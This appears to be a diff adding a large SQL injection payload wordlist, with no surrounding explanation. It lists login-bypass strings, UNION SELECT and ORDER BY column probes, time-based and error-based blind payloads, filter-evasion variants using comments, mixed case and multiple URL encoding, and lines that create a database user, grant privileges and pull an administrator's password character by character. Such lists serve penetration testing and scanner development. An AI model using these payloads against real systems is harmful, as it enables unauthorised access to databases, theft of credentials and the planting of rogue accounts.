+'; dbms_pipe.receive_message(CHR(66)||CHR(66)||CHR(66),20)--
+declare @q nvarchar (200) 0x730065006c00650063 ...
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+declare @q nvarchar (200) select @q = 0x770061 ...
+declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+declare @q nvarchar (4000) select @q =
+declare @s varchar (200) select @s = 0x73656c6 ...
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+declare @s varchar(200) select @s = 0x77616974 ...
+declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) 
+ducnt1337" OR if(1/(length((select('a')))-1)=1,true,false) or "a"="b-- 
+%E2%80%98%20or%201%3D1--
+%E2%80%98%20or%201%3D1%20%23
+%E2%80%98or%E2%80%9D%3D%E2%80%99
+%E2%80%99OR%201%3D1%20-%20%2B
+%E2%80%99OR%201%3D1%20--%20%2B
+%E2%80%9D%20or%201%3D1--
+%E2%80%9D%20or%201%3D1%20%23
+/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table
+/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -
+/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/
+' grant connect to name; grant resource to name; --
+' GROUP BY columnnames having 1=1 --
+' group by password having 1=1--
+ group by userid having 1=1--
+' group by userid having 1=1--
+' group by username having 1=1--
+/*!group_concat*/()
+group_concat(/*!*/)
+gRoUp_cOnCAt()
+/*!GrOuP_ConCaT*/()
+/*!group_concat*/(/*!12345table_name*/)
+group_concat(/*!12345table_name*/)
+/*!group_concat*/(/*!50000table_name*/)
+group_concat(/*!50000table_name*/)
+hi or 1=1 --"
+hi" or 1=1 --
+hi' or 1=1 --
+"hi"") or (""a""=""a"
+hi or a=a
+hi" or "a"="a
+hi' or 'a'='a
+hi') or ('a'='a
+'hi' or 'x'='x';
+hi' or 'x'='x';
+IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
+IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
+' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --
+INSERT INTO table(a,b,c)VALUES(1,2,'$user_agent')
+INSERT INTO table(a,b,c)VALUES(1,2,3),(4,5,6);
+' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
+*(|(objectclass=*))
+" or ""="
+') or ('')=('
+')) or ((''))=(('
+or ''='
+" or "" "
+" or ""&"
+" or ""*"
+" or ""-"
+" or ""="
+" or ""^"
+' or "
+' or '' '
+' or ''&'
+' or ''*'
+' or ''-'
+' or ''='
+' or ''^'
+'' or ''='
+'or''='
+-- or # 
+‘or”=’
+or
+" OR "" = "
+' OR '' = '
+or 0=0 #
+or 0=0 #"
+or 0=0 --
+or 0=0 –
+" or 0=0 #
+" or 0=0 --
+" or 0=0 –
+%' or '0'='0
+' or         0=0 #
+' or 0=0 #
+' or 0=0 --
+' or 0=0 –
+or 0=0 #
+or 0=0 #"
+or 0=0 --
+" or 1--
+') or 1--
+or 1 --'
+or 1/*
+' or 1 --'
+' or 1--
+' OR '1
+' OR 1 -- -
+OR 1=0
+OR 1=0#
+OR 1=0-- 
+OR 1=0
+OR 1=0#
+OR 1=0-- 
+ or 1=1 --
+or '1'='1
+or '1'='1'--
+or 1=1
+or 1=1 /*
+or 1=1#
+or 1=1--
+or 1=1/*
+or 1=1–
+" or "1"="1
+" or "1"="1"#
+" or "1"="1"--
+" or "1"="1"/*
+" or 1=1
+" or 1=1 --
+" or 1=1 –
+" or 1=1#
+" or 1=1--
+" or 1=1/*
+" or 1=1–
+") or "1"="1
+") or "1"="1"#
+") or "1"="1"--
+") or "1"="1"/*
+") or "1"="1--
+") or ("1"="1
+") or ("1"="1"#
+") or ("1"="1"--
+") or ("1"="1"/*
+' or '1'='1
+' or '1'='1'#
+' or '1'='1'--
+' or '1'='1'/*
+' or '1'='1--
+' or '1'='1/*
+' or '1'='1;--
+' or '1′='1
+' or 1=1
+' or 1=1 --
+' or 1=1 –
+' or 1=1#
+' or 1=1--
+' or 1=1/*
+' or 1=1;#
+' or 1=1;--
+' or 1=1–
+') or '1'='1
+') or '1'='1'#
+') or '1'='1'--
+') or '1'='1'/*
+') or '1'='1--
+') or ('1'='1
+') or ('1'='1'#
+') or ('1'='1'--
+') or ('1'='1'/*
+') or ('1'='1--
+'or'1=1
+'or'1=1'
+'or'1=1'/
+'or'1=1′
+) or '1'='1--
+) or '1′='1–
+) or ('1'='1--
+) or ('1′='1–
+- `' or 1=1#`
+- `' or 1=1--`
+- `' or 1=1/*`
+- `') or '1'='1--`
+- `') or ('1'='1--`
+/**/or/**/1/**/=/**/1
+; or '1'='1'
+‘ or 1=1 #
+‘ or 1=1--
+” or 1=1 #
+” or 1=1--
+or '1'='1
+or 1=1
+or 1=1 #
+or 1=1#
+or 1=1--
+or 1=1/
+or 1=1/*
+ OR 1=1
+ OR 1=1#
+ OR 1=1-- 
+" OR 1 = 1 -- -
+'+OR+'1'='1#
+'+OR+'1'='1/*
+'+OR+1=1#
+'+OR+1=1--
+'+OR+1=1/*
+’OR 1=1 - +
+’OR 1=1 -- +
+OR 1=1
+OR 1=1#
+OR 1=1-- 
+' or 1=1;%00
+' or 1=1 LIMIT 1;#
+ or 1=1 or ""=
+ or 1=1 or ''='
+"or 1=1 or ""="
+' or 1=1 or ''='
+'or 1=1 or ''='
+or 1=1 or ""=
+OR 1=1 OR 1=0 OR x=x OR x=y OR 1=1# OR 1=0# OR x=x# OR x=y# OR 1=1-- OR 1=0-- OR x=x-- OR x=y-- OR 3409=3409 AND ('pytW' LIKE 'pytW OR 3409=3409 AND ('pytW' LIKE 'pytY HAVING 1=1 HAVING 1=0 HAVING 1=1# HAVING 1=0# HAVING 1=1-- HAVING 1=0-- AND 1=1 AND 1=0 AND 1=1-- AND 1=0-- AND 1=1# AND 1=0# AND 1=1 AND '%'=' AND 1=0 AND '%'=' AND 1083=1083 AND (1427=1427 AND 7506=9091 AND (5913=5913 AND 1083=1083 AND ('1427=1427 AND 7506=9091 AND ('5913=5913 AND 7300=7300 AND 'pKlZ'='pKlZ AND 7300=7300 AND 'pKlZ'='pKlY AND 7300=7300 AND ('pKlZ'='pKlZ AND 7300=7300 AND ('pKlZ'='pKlY AS INJECTX WHERE 1=1 AND 1=1 
+'+OR+1=1+UNION+SELECT+null,+user()+--+-
+'or-1%23
+OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2000000000/2))))
++OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1
+ or 1 in (select @@version)--
+or%200%3D0%20--
+or%200%3D0%20%23
+or%200%3D0%20%23%22
+or%200%3D0%20%E2%80%93
+or%201=1
+or%201=1 --
+or%201%20--%27
+or%201/%2A
+OR%201%3D0
+OR%201%3D0--
+OR%201%3D0%23
+or%201%3D1
+or%201%3D1--
+or%201%3D1/
+OR%201%3D1
+OR%201%3D1--
+or%201%3D1%20%23
+or%201%3D1%20/%2A
+or%201%3D1%20or%20%22%22%3D
+or%201%3D1%20or%20%27%27%3D%27
+or%201%3D1%23
+OR%201%3D1%23
+or%201%3D1/%2A
+or%201%3D1%E2%80%93
+or%20%271%27%3D%271
+or%20%271%27%3D%271%27--
+or%20%27%27%3D%27
+or%20%27text%27%20%3D%20n%27text%27
+or%20%27text%27%20%3E%20%27t%27
+or%20true
+or%20true--
+or 2 > 1
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2000000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+or '7659'='7659
+or 'a'='a
+or a = a
+or a=a
+or a=a--
+" or "a"="a
+") or ("a"="a
+' or 'a'='a
+' or 'a'='a;--
+' or a=a--
+' or a=a–
+') or ('a'='a
+) or ('a'='a
+) or (a=a
+‘ or ‘a’=’a
+‘) or (‘a’=’a
+” or “a”=”a
+or a = a
+or a=a
+') or ('a'='a and hi") or ("a"="a
+'=' 'or' and '=' 'or'
+order by
+ORDER BY 1 
+ORDER BY 1# 
+ORDER BY 1-- 
+' ORDER BY 1--
+ORDER BY 1 
+ORDER BY 1# 
+ORDER BY 1-- 
+ORDER BY 10 
+ORDER BY 10# 
+ORDER BY 10-- 
+ORDER BY 10 
+ORDER BY 10# 
+ORDER BY 10-- 
+ORDER BY 11  
+ORDER BY 11# 
+ORDER BY 11-- 
+ORDER BY 11 
+ORDER BY 11# 
+ORDER BY 11-- 
+ORDER BY 12 
+ORDER BY 12# 
+ORDER BY 12-- 
+ORDER BY 12 
+ORDER BY 12# 
+ORDER BY 12-- 
+ORDER BY 12-- ORDER BY 13-- ORDER BY 14-- ORDER BY 15-- ORDER BY 16-- ORDER BY 17-- ORDER BY 18-- ORDER BY 19-- ORDER BY 20-- ORDER BY 21-- ORDER BY 22-- ORDER BY 23-- ORDER BY 24-- ORDER BY 25-- ORDER BY 26-- ORDER BY 27-- 
+ORDER BY 13 
+ORDER BY 13# 
+ORDER BY 13-- 
+ORDER BY 13 
+ORDER BY 13# 
+ORDER BY 13-- 
+ORDER BY 14 
+ORDER BY 14# 
+ORDER BY 14-- 
+ORDER BY 14 
+ORDER BY 14# 
+ORDER BY 14-- 
+ORDER BY 15 
+ORDER BY 15# 
+ORDER BY 15-- 
+ORDER BY 15 
+ORDER BY 15# 
+ORDER BY 15-- 
+ORDER BY 16 
+ORDER BY 16# 
+ORDER BY 16-- 
+ORDER BY 16 
+ORDER BY 16# 
+ORDER BY 16-- 
+ORDER BY 17 
+ORDER BY 17# 
+ORDER BY 17-- 
+ORDER BY 17 
+ORDER BY 17# 
+ORDER BY 17-- 
+ORDER BY 18 
+ORDER BY 18# 
+ORDER BY 18-- 
+ORDER BY 18 
+ORDER BY 18# 
+ORDER BY 18-- 
+ORDER BY 19 
+ORDER BY 19# 
+ORDER BY 19-- 
+ORDER BY 19 
+ORDER BY 19# 
+ORDER BY 19-- 
+ORDER BY 2 
+ORDER BY 2# 
+ORDER BY 2-- 
+' ORDER BY 2--
+ORDER BY 2 
+ORDER BY 2# 
+ORDER BY 2-- 
+ORDER BY 20 
+ORDER BY 20# 
+ORDER BY 20-- 
+ORDER BY 20 
+ORDER BY 20# 
+ORDER BY 20-- 
+ORDER BY 21 
+ORDER BY 21#  
+ORDER BY 21-- 
+ORDER BY 21 
+ORDER BY 21# 
+ORDER BY 21-- 
+ ORDER BY 22 
+ ORDER BY 22# 
+ ORDER BY 22-- 
+ORDER BY 22 
+ORDER BY 22# 
+ORDER BY 22-- 
+ ORDER BY 23 
+ ORDER BY 23# 
+ ORDER BY 23-- 
+ORDER BY 23 
+ORDER BY 23# 
+ORDER BY 23-- 
+ ORDER BY 24 
+ ORDER BY 24# 
+ ORDER BY 24-- 
+ORDER BY 24 
+ORDER BY 24# 
+ORDER BY 24-- 
+ ORDER BY 25 
+ ORDER BY 25# 
+ ORDER BY 25-- 
+ORDER BY 25 
+ORDER BY 25# 
+ORDER BY 25-- 
+ ORDER BY 26 
+ ORDER BY 26# 
+ ORDER BY 26-- 
+ORDER BY 26 
+ORDER BY 26# 
+ORDER BY 26-- 
+ ORDER BY 27 
+ ORDER BY 27# 
+ ORDER BY 27-- 
+ORDER BY 27 
+ORDER BY 27# 
+ORDER BY 27-- 
+ ORDER BY 28 
+ ORDER BY 28# 
+ ORDER BY 28-- 
+ORDER BY 28 
+ORDER BY 28# 
+ORDER BY 28-- 
+ ORDER BY 29 
+ ORDER BY 29# 
+ ORDER BY 29-- 
+ORDER BY 29 
+ORDER BY 29# 
+ORDER BY 29-- 
+ ORDER BY 3 
+ ORDER BY 3# 
+ ORDER BY 3-- 
+' ORDER BY 3--
+ORDER BY 3 
+ORDER BY 3# 
+ORDER BY 3-- 
+ ORDER BY 30 
+ ORDER BY 30#
+ ORDER BY 30-- 
+ORDER BY 30 
+ORDER BY 30#
+ORDER BY 30-- 
+ ORDER BY 31337 
+ ORDER BY 31337#
+ ORDER BY 31337-- 
+ORDER BY 31337 
+ORDER BY 31337#
+ORDER BY 31337-- 
+ ORDER BY 4 
+ ORDER BY 4# 
+ ORDER BY 4-- 
+ORDER BY 4 
+ORDER BY 4# 
+ORDER BY 4-- 
+'order+by+5”--+-
+ ORDER BY 5 
+ ORDER BY 5# 
+ ORDER BY 5-- 
+ORDER BY 5 
+ORDER BY 5# 
+ORDER BY 5-- 
+ ORDER BY 6 
+ ORDER BY 6# 
+ ORDER BY 6-- 
+ORDER BY 6 
+ORDER BY 6# 
+ORDER BY 6-- 
+ ORDER BY 7 
+ ORDER BY 7# 
+ ORDER BY 7-- 
+ORDER BY 7 
+ORDER BY 7# 
+ORDER BY 7-- 
+ ORDER BY 8 
+ ORDER BY 8# 
+ ORDER BY 8-- 
+ORDER BY 8 
+ORDER BY 8# 
+ORDER BY 8-- 
+ ORDER BY 9 
+ ORDER BY 9# 
+ ORDER BY 9-- 
+'+ORDER+BY+9 — -
+ORDER BY 9 
+ORDER BY 9# 
+ORDER BY 9-- 
+or 'something' = 'some'+'thing'
+or 'text' = n'text'
+or 'text' > 't'
+" or true--
+") or true--
+or true
+" or true--
+") or true--
+' or true--
+'' or true--'
+') or true--
+or true--
+' or uid like '%
+' or uname like '%
+ or 'unusual' = 'unusual'
+' or userid like '%
+' or user like '%
+' or username like '%
+or username like char(37);
+or 'whatever' in ('whatever')
+" or "x"="
+') or ('x')=('
+ ')) or (('x'))=(('
+‘)) or ((‘x’))=((‘
+’)) or ((‘x’))=((‘ &Password=’)) or ((‘x’))=((‘
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+' or 'x'='x
+') or ('x')=('x
+') or ('x'='x
+')) or (('x'))=(('x
+ OR x=x
+ OR x=x#
+ OR x=x-- 
+' OR 'x'='x
+' OR 'x'='x'#;
+OR x=x
+OR x=x#
+OR x=x-- 
+ OR x=y
+ OR x=y#
+ OR x=y-- 
+OR x=y
+OR x=y#
+OR x=y-- 
+';return 'a'=='a' && ''=='
+";return(true);var xyz='a
+REVERSE(noinu)+REVERSE(tceles)
+ RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+ RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+root" #
+root" --
+root"/*
+root' #
+root' --
+root'/*
+root')%20or%20'1'%3D'1'--
+root%22%20or%201%3D1%20or%20%22%22%3D%22
+root')%2520or%2520'1'%253D'1'--
+root%2522%2520or%25201%253D1%2520or%2520%2522%2522%253D%2522
+root')%252520or%252520'1'%25253D'1'--
+root%252522%252520or%2525201%25253D1%252520or%252520%252522%252522%25253D%252522
+root%27%29%20or%20%271%27%3D%271
+root%27%29%20or%20%271%27%3D%271%27--
+root%27%29%20or%20%271%27%3D%271%27%23
+root%27%29%20or%20%271%27%3D%271%27/%2A
+root%27%29%20or%20%28%271%27%3D%271
+root%27%29%20or%20%28%271%27%3D%271%27--
+root%27%29%20or%20%28%271%27%3D%271%27%23
+root%27%29%20or%20%28%271%27%3D%271%27/%2A
+root" or "1"="1
+root" or "1"="1"#
+root" or "1"="1"--
+root" or "1"="1"/*
+root" or 1=1
+root" or 1=1#
+root" or 1=1--
+root" or 1=1/*
+root") or "1"="1
+root") or "1"="1"#
+root") or "1"="1"--
+root") or "1"="1"/*
+root") or ("1"="1
+root") or ("1"="1"#
+root") or ("1"="1"--
+root") or ("1"="1"/*
+root' or '1'='1
+root' or '1'='1'#
+root' or '1'='1'--
+root' or '1'='1'/*
+root' or 1=1
+root' or 1=1#
+root' or 1=1--
+root' or 1=1/*
+root') or '1'='1
+root') or '1'='1'#
+root') or '1'='1'--
+root') or '1'='1'/*
+root') or ('1'='1
+root') or ('1'='1'#
+root') or ('1'='1'--
+root') or ('1'='1'/*
+root" or 1=1 or ""="
+root'or 1=1 or ''='
+Sedan ORDER BY 1 -
+Sedan ORDER BY 2 -
+Sedan ORDER BY 2 --
+select
+'||(SELECT '')||'
+SELECT 0 FROM (SELECT count(*), CONCAT((SELECT @@version), 0x23, FLOOR(RAND(0)*4)) AS Y000 FROM information_schema.tables GROUP BY Y000) x
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+'||(SELECT '' FROM dual)||'
+ select * from information_schema.tables--
+select * from master..sysserverse
+'||(SELECT '' FROM not-a-real-table)||'
+SELECT * FROM (SELECT count(*), CONCAT((SELECT database()), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y --
+select * from sysusers
+'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+SELECT * FROM XYZ_TABLE WHERE CAT=1 union select all 1,table_name,3,4,5,6,7,8,9,10,11 from information_schema.tables where table_schema = 'acuart'
+SELECT IF(IFNULL(1/0,'a'),'NO',JSON_OBJECT(1, concat(table_name))) FROM  information_schema.tables WHERE `table_name` REGEXP 'admin'
+Select if(now()=sysdate(),(select table_name),0) from information_schema.tables
+SELECT IFNULL(1+1/0,table_name) FROM information_schema.tables
+SELECT IF(STRCMP('1','1'),'_Y000!_',table_name) FROM information_schema.tables
+select json_arrayagg(concat(JSON_OBJECT(concat(JSON_OBJECT(concat(current_user()), concat(@@version))), '_Y000!_')))
+select JSON_OBJECT(1, @@version)
+select json_objectagg(1, @@datadir)
+select @@microsoftversione
+SELECT name, description FROM products WHERE category = 'Gifts'
+ select name from syscolumns where id = (sele ...
+SELECT NULLIF(table_name,2) from information_schema.tables
+SELECT NULL,username||'~'||password FROM users--
+(select substring(@@version,2,1))='i' and (select substring(@@version,2,1))='y' and (select substring(@@version,3,1))='c' and (select substring(@@version,3,1))='S' and (select substring(@@version,3,1))='X
+ (select top 1
+' (select top 1
+SELECT TRIM(UpdateXML(table_name, '_Y000_', '1111')) FROM information_schema.tables
+select UNHEX(HEX(lpad(table_name,50,'>'))) from information_schema.tables
+SELECT UNHEX(HEX(table_name))from information_schema.tables
+select upper(reverse(right(reverse(table_name),100)))from information_schema.tables where table_schema sounds like database()
+select @@version
+/*!u%6eion*/ /*!se%6cect*/
+/*!u%6eion*/ /*!se%6cect*/+1,concat(@:=0,(select count(*)from information_schema.columns where@:=concat(@,'<br>',table_name,'::',column_name)),@),3..
+<uid1>' or '1'='1
+uid1' or '1'='1
+uid1>' or '1'='1
+unhex(hex(/*!12345concat*/(table_name)))
+unhex(hex(/*!12345group_concat*/(/*!12345table_name*/)))
+unhex(hex(/*!12345group_concat*/(/*!table_name*/)))
+unhex(hex(/*!12345group_concat*/(table_name)))
+unhex(hex(/*!50000concat*/(table_name)))
+unhex(hex(concat(table_name)))
+unhex(hex(/*!group_concat*/(/*!table_name*/)))
+unhex(hex(group_concat(table_name)))
++uni%0bon+se%0blect+
+uni%0bon+se%0blect
+uni%20union%20/*!select*/%20
+/^.*union.*$/ /^.*select.*$/
++UnIOn%0d%0aSeleCt%0d%0a
+UNION%20ALL%20SELECT%201%2C2%2C3
+UNION%20ALL%20SELECT%201%2C2%2C3--
+UNION%20ALL%20SELECT%201%2C2%2C3--%20
+UNION%20ALL%20SELECT%201%2C2%2C3%23
+UNION%20ALL%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30
+UNION%20ALL%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30--
+UNION%20ALL%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30--%20
+UNION%20ALL%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%23
+union%23aa%0Aselect
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
++union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
+UNION%2520ALL%2520SELECT%25201%252C2%252C3
+UNION%2520ALL%2520SELECT%25201%252C2%252C3--%2520
+UNION%2520ALL%2520SELECT%25201%252C2%252C3%2523
+UNION%2520ALL%2520SELECT%25201%252C2%252C3%252C4%252C5%252C6%252C7%252C8%252C9%252C10%252C11%252C12%252C13%252C14%252C15%252C16%252C17%252C18%252C19%252C20%252C21%252C22%252C23%252C24%252C25%252C26%252C27%252C28%252C29%252C30--%2520
+UNION%252520ALL%252520SELECT%2525201%25252C2%25252C3
+UNION%252520ALL%252520SELECT%2525201%25252C2%25252C3--%252520
+union /*!50000%53elect*/
+/**/union/*!50000select*/
+/**/union/*!50000select*//**/
+/**/UNION/**//*!50000SELECT*//**/
+uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
+/*!union*//*--*//*!all*//*--*//*!select*/
+uNiOn aLl sElEcT
+UNION ALL SELECT
+' UNION ALL SELECT
+UNION ALL SELECT 1
+UNION ALL SELECT 1#
+UNION ALL SELECT 1-- 
+UNION ALL SELECT 1
+UNION ALL SELECT 1#
+UNION ALL SELECT 1-- 
+UNION ALL SELECT 1,2
+UNION ALL SELECT 1,2#
+UNION ALL SELECT 1,2-- 
+UNION ALL SELECT 1,2
+UNION ALL SELECT 1,2#
+UNION ALL SELECT 1,2-- 
+UNION ALL SELECT 1,2,3
+UNION ALL SELECT 1,2,3#
+UNION ALL SELECT 1,2,3-- 
+UNION ALL SELECT 1,2,3
+UNION ALL SELECT 1,2,3#
+UNION ALL SELECT 1,2,3-- 
++/*✓*/UnIoN/*✓*/+/*✓*/AlL/*✓*/+(SeLeCt+1,2,3,%27soy%20vulnerable%27,5,6.....)+--+
+UNION ALL SELECT 1,2,3,4
+UNION ALL SELECT 1,2,3,4#
+UNION ALL SELECT 1,2,3,4-- 
+UNION ALL SELECT 1,2,3,4
+UNION ALL SELECT 1,2,3,4#
+UNION ALL SELECT 1,2,3,4-- 
+UNION ALL SELECT 1,2,3,4,5
+UNION ALL SELECT 1,2,3,4,5#
+UNION ALL SELECT 1,2,3,4,5-- 
+UNION ALL SELECT 1,2,3,4,5
+UNION ALL SELECT 1,2,3,4,5#
+UNION ALL SELECT 1,2,3,4,5-- 
+UNION ALL SELECT 1,2,3,4,5,6
+UNION ALL SELECT 1,2,3,4,5,6#
+UNION ALL SELECT 1,2,3,4,5,6-- 
+UNION ALL SELECT 1,2,3,4,5,6
+UNION ALL SELECT 1,2,3,4,5,6#
+UNION ALL SELECT 1,2,3,4,5,6-- 
+UNION ALL SELECT 1,2,3,4,5,6,7
+UNION ALL SELECT 1,2,3,4,5,6,7#
+UNION ALL SELECT 1,2,3,4,5,6,7-- 
+UNION ALL SELECT 1,2,3,4,5,6,7
+UNION ALL SELECT 1,2,3,4,5,6,7#
+UNION ALL SELECT 1,2,3,4,5,6,7-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8
+UNION ALL SELECT 1,2,3,4,5,6,7,8#
+UNION ALL SELECT 1,2,3,4,5,6,7,8-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8
+UNION ALL SELECT 1,2,3,4,5,6,7,8#
+UNION ALL SELECT 1,2,3,4,5,6,7,8-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- 
++UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- 
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#
+UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- 
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
+ UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#
